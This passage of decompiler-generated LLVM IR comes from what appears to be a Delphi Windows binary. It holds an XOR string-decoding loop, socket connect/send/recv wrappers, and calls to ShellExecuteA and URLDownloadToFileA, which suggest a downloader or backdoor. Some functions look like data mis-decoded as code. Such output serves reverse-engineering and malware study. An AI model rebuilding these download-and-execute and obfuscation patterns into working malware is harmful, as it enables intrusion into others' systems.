  %0 = call i32 @__readfsdword(i32 0), !insn.addr !224
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404639() local_unnamed_addr {
dec_label_pc_404639:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40463e() local_unnamed_addr {
dec_label_pc_40463e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_404640(i32 %arg1) local_unnamed_addr {
dec_label_pc_404640:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404644() local_unnamed_addr {
dec_label_pc_404644:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40464f() local_unnamed_addr {
dec_label_pc_40464f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = load i8, i8* %5, align 4, !insn.addr !239
  %22 = add i8 %21, %15, !insn.addr !239
  %23 = load i32, i32* %eax, align 4, !insn.addr !239
  %24 = inttoptr i32 %23 to i8*, !insn.addr !239
  store i8 %22, i8* %24, align 1, !insn.addr !239
  %25 = load i8, i8* %5, align 4, !insn.addr !240
  %26 = load i32, i32* %eax, align 4
  %27 = trunc i32 %26 to i8, !insn.addr !240
  %28 = add i8 %25, %27, !insn.addr !240
  %29 = inttoptr i32 %26 to i8*, !insn.addr !240
  store i8 %28, i8* %29, align 1, !insn.addr !240
  %30 = load i8, i8* %5, align 4, !insn.addr !241
  %31 = load i32, i32* %eax, align 4
  %32 = trunc i32 %31 to i8, !insn.addr !241
  %33 = add i8 %30, %32, !insn.addr !241
  %34 = inttoptr i32 %31 to i8*, !insn.addr !241
  store i8 %33, i8* %34, align 1, !insn.addr !241
  %35 = load i8, i8* %5, align 4, !insn.addr !242
  %36 = load i32, i32* %eax, align 4
  %37 = trunc i32 %36 to i8, !insn.addr !242
  %38 = add i8 %35, %37, !insn.addr !242
  %39 = inttoptr i32 %36 to i8*, !insn.addr !242
  store i8 %38, i8* %39, align 1, !insn.addr !242
  %40 = add i32 %0, -117, !insn.addr !243
  %41 = inttoptr i32 %40 to i8*, !insn.addr !243
  %42 = load i8, i8* %41, align 1, !insn.addr !243
  %43 = trunc i32 %2 to i8, !insn.addr !243
  %44 = add i8 %42, %43, !insn.addr !243
  store i8 %44, i8* %41, align 1, !insn.addr !243
  %45 = trunc i32 %2 to i16, !insn.addr !244
  %46 = call i8 @__asm_in(i16 %45), !insn.addr !244
  %47 = add i32 %20, -8, !insn.addr !245
  %48 = inttoptr i32 %47 to i32*, !insn.addr !245
  store i32 4212417, i32* %48, align 4, !insn.addr !245
  %49 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %50 = add i32 %20, -12, !insn.addr !246
  %51 = inttoptr i32 %50 to i32*, !insn.addr !246
  store i32 %49, i32* %51, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !247
  %52 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %53 = add i32 %52, 1, !insn.addr !248
  %54 = icmp eq i32 %53, 0, !insn.addr !248
  store i32 %53, i32* @global_var_409678, align 4, !insn.addr !248
  %55 = icmp eq i1 %54, false, !insn.addr !249
  br i1 %55, label %dec_label_pc_4046b3, label %dec_label_pc_404681, !insn.addr !249

dec_label_pc_404681:                              ; preds = %dec_label_pc_40464f
  %56 = call i32 @"@LStrClr"(), !insn.addr !250
  %57 = call i32 @"@LStrClr"(), !insn.addr !251
  %58 = call i32 @"@LStrClr"(), !insn.addr !252
  %59 = call i32 @"@LStrClr"(), !insn.addr !253
  %60 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046b3, !insn.addr !254

dec_label_pc_4046b3:                              ; preds = %dec_label_pc_404681, %dec_label_pc_40464f
  %61 = add i32 %20, -4, !insn.addr !255
  %62 = inttoptr i32 %61 to i32*, !insn.addr !255
  %63 = load i32, i32* %51, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !257
  store i32 4212424, i32* %62, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046c1() local_unnamed_addr {
dec_label_pc_4046c1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046c6() local_unnamed_addr {
dec_label_pc_4046c6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046cc() local_unnamed_addr {
dec_label_pc_4046cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_4046d4() local_unnamed_addr {
dec_label_pc_4046d4:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_403720(), !insn.addr !266
  %1 = call i32 @function_4034c8(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404709, label %dec_label_pc_4046ef, !insn.addr !268

dec_label_pc_4046ef:                              ; preds = %dec_label_pc_4046d4, %dec_label_pc_4046ef
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint (i8** @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_4046ef, label %dec_label_pc_404709, !insn.addr !276

dec_label_pc_404709:                              ; preds = %dec_label_pc_4046ef, %dec_label_pc_4046d4
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_404710() local_unnamed_addr {
dec_label_pc_404710:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404735() local_unnamed_addr {
dec_label_pc_404735:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_40473a() local_unnamed_addr {
dec_label_pc_40473a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_40473c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40473c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_404740() local_unnamed_addr {
dec_label_pc_404740:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404748() local_unnamed_addr {
dec_label_pc_404748:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_40476d() local_unnamed_addr {
dec_label_pc_40476d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_404772() local_unnamed_addr {
dec_label_pc_404772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_404774(i32 %arg1) local_unnamed_addr {
dec_label_pc_404774:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_404778() local_unnamed_addr {
dec_label_pc_404778:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_404780(i32 %s) local_unnamed_addr {
dec_label_pc_404780:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_404788(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404788:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_404790(i16 %hostshort) local_unnamed_addr {
dec_label_pc_404790:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_404798(%in_addr %in) local_unnamed_addr {
dec_label_pc_404798:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047a0(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047a8(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a8:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047b0(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047b0:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047b8(i8* %name) local_unnamed_addr {
dec_label_pc_4047b8:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047c0(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047c0:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047c8(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047c8:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047d0() local_unnamed_addr {
dec_label_pc_4047d0:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_4047d8() local_unnamed_addr {
dec_label_pc_4047d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_4047fd() local_unnamed_addr {
dec_label_pc_4047fd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_404802() local_unnamed_addr {
dec_label_pc_404802:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404804(i32 %arg1) local_unnamed_addr {
dec_label_pc_404804:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404808() local_unnamed_addr {
dec_label_pc_404808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_4049a8() local_unnamed_addr {
dec_label_pc_4049a8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !322
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !322
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !322
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !323
  %2 = load i32, i32* @global_var_409688, align 4, !insn.addr !324
  %3 = add i32 %2, 1, !insn.addr !324
  store i32 %3, i32* @global_var_409688, align 4, !insn.addr !324
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !325
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !326
  ret i32 0, !insn.addr !327
}

define i32 @function_4049cd() local_unnamed_addr {
dec_label_pc_4049cd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !328
  ret i32 %0, !insn.addr !328
}

define i32 @function_4049d2() local_unnamed_addr {
dec_label_pc_4049d2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !329
}

define i32 @function_4049d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4049d4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !330
}

define i32 @function_4049d8() local_unnamed_addr {
dec_label_pc_4049d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409688, align 4, !insn.addr !331
  %2 = add i32 %1, -1, !insn.addr !331
  store i32 %2, i32* @global_var_409688, align 4, !insn.addr !331
  ret i32 %0, !insn.addr !332
}

define i32 @function_4049e0() local_unnamed_addr {
dec_label_pc_4049e0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !333
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !333
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !333
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !334
  %2 = load i32, i32* @global_var_40968c, align 4, !insn.addr !335
  %3 = add i32 %2, 1, !insn.addr !335
  store i32 %3, i32* @global_var_40968c, align 4, !insn.addr !335
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !336
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !337
  ret i32 0, !insn.addr !338
}

define i32 @function_404a05() local_unnamed_addr {
dec_label_pc_404a05:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !339
  ret i32 %0, !insn.addr !339
}

define i32 @function_404a0a() local_unnamed_addr {
dec_label_pc_404a0a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !340
}

define i32 @function_404a0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !341
}

define i32 @function_404a10() local_unnamed_addr {
dec_label_pc_404a10:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !342
  %2 = add i32 %1, -1, !insn.addr !342
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !342
  ret i32 %0, !insn.addr !343
}

define i32* @function_404a18(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404a18:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !344
  ret i32* %0, !insn.addr !344
}

define i32 @function_404a20() local_unnamed_addr {
dec_label_pc_404a20:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !345
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !345
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !345
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !346
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !347
  %3 = add i32 %2, 1, !insn.addr !347
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !347
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !348
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !349
  ret i32 0, !insn.addr !350
}

define i32 @function_404a45() local_unnamed_addr {
dec_label_pc_404a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !351
  ret i32 %0, !insn.addr !351
}

define i32 @function_404a4a() local_unnamed_addr {
dec_label_pc_404a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !352
}

define i32 @function_404a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !353
}

define i32 @function_404a50() local_unnamed_addr {
dec_label_pc_404a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !354
  %2 = add i32 %1, -1, !insn.addr !354
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !354
  ret i32 %0, !insn.addr !355
}

define i32 @function_404a58() local_unnamed_addr {
dec_label_pc_404a58:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !356
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !356
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !356
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !357
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !358
  %3 = add i32 %2, 1, !insn.addr !358
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !358
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !359
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !360
  ret i32 0, !insn.addr !361
}

define i32 @function_404a7d() local_unnamed_addr {
dec_label_pc_404a7d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !362
  ret i32 %0, !insn.addr !362
}

define i32 @function_404a82() local_unnamed_addr {
dec_label_pc_404a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !363
}

define i32 @function_404a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a84:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !364
}

define i32 @function_404a88() local_unnamed_addr {
dec_label_pc_404a88:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !365
  %2 = add i32 %1, -1, !insn.addr !365
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !365
  ret i32 %0, !insn.addr !366
}

define i32 @function_404a90() local_unnamed_addr {
dec_label_pc_404a90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !367
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !367
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !367
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !368
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !369
  %3 = add i32 %2, 1, !insn.addr !369
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !369
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !370
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !371
  ret i32 0, !insn.addr !372
}

define i32 @function_404ab5() local_unnamed_addr {
dec_label_pc_404ab5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !373
  ret i32 %0, !insn.addr !373
}

define i32 @function_404aba() local_unnamed_addr {
dec_label_pc_404aba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !374
}

define i32 @function_404abc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !375
}

define i32 @function_404ac0() local_unnamed_addr {
dec_label_pc_404ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !376
  %2 = add i32 %1, -1, !insn.addr !376
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !376
  ret i32 %0, !insn.addr !377
}

define i32 @function_404ac8(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_404ac8:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !378
  ret i32 %0, !insn.addr !378
}

define i32 @function_404ad0() local_unnamed_addr {
dec_label_pc_404ad0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !379
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !379
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !379
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !380
  %2 = load i32, i32* @global_var_40969c, align 4, !insn.addr !381
  %3 = add i32 %2, 1, !insn.addr !381
  store i32 %3, i32* @global_var_40969c, align 4, !insn.addr !381
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !382
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !383
  ret i32 0, !insn.addr !384
}

define i32 @function_404af5() local_unnamed_addr {
dec_label_pc_404af5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !385
  ret i32 %0, !insn.addr !385
}

define i32 @function_404afa() local_unnamed_addr {
dec_label_pc_404afa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !386
}

define i32 @function_404afc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404afc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !387
}

define i32 @function_404b00() local_unnamed_addr {
dec_label_pc_404b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40969c, align 4, !insn.addr !388
  %2 = add i32 %1, -1, !insn.addr !388
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !388
  ret i32 %0, !insn.addr !389
}

define i32 @function_404b08() local_unnamed_addr {
dec_label_pc_404b08:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !390
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_404b0c, label %dec_label_pc_404b15, !insn.addr !391

dec_label_pc_404b0c:                              ; preds = %dec_label_pc_404b08
  %4 = add nuw nsw i32 %3, 48, !insn.addr !392
  ret i32 %4, !insn.addr !393

dec_label_pc_404b15:                              ; preds = %dec_label_pc_404b08
  %5 = add nuw nsw i32 %3, 55, !insn.addr !394
  ret i32 %5, !insn.addr !395
}

define i32 @function_404b20() local_unnamed_addr {
dec_label_pc_404b20:
  %esp.2.reg2mem = alloca i32, !insn.addr !396
  %esp.1.reg2mem = alloca i32, !insn.addr !396
  %cf.0.reg2mem = alloca i1, !insn.addr !396
  %esi.0.reg2mem = alloca i32, !insn.addr !396
  %esp.0.reg2mem = alloca i32, !insn.addr !396
  %ebx.0.reg2mem = alloca i32, !insn.addr !396
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !397
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !398
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !398
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !398
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !399
  %4 = call i32 @"@LStrClr"(), !insn.addr !400
  %5 = call i32 @function_4034c8(), !insn.addr !401
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !402
  br i1 %6, label %dec_label_pc_404c21, label %dec_label_pc_404b6d.preheader, !insn.addr !402

dec_label_pc_404b6d.preheader:                    ; preds = %dec_label_pc_404b20
  %7 = add i32 %0, -1, !insn.addr !403
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_404b6d

dec_label_pc_404b6d:                              ; preds = %dec_label_pc_404b6d.preheader, %dec_label_pc_404c19
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !403
  %9 = inttoptr i32 %8 to i8*, !insn.addr !403
  %10 = load i8, i8* %9, align 1, !insn.addr !403
  %11 = icmp eq i8 %10, 32, !insn.addr !403
  %12 = icmp eq i1 %11, false, !insn.addr !404
  br i1 %12, label %dec_label_pc_404b88, label %dec_label_pc_404b77, !insn.addr !404

dec_label_pc_404b77:                              ; preds = %dec_label_pc_404b6d
  %13 = call i32 @"@LStrCat"(), !insn.addr !405
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !406
  br label %dec_label_pc_404c19, !insn.addr !406

dec_label_pc_404b88:                              ; preds = %dec_label_pc_404b6d
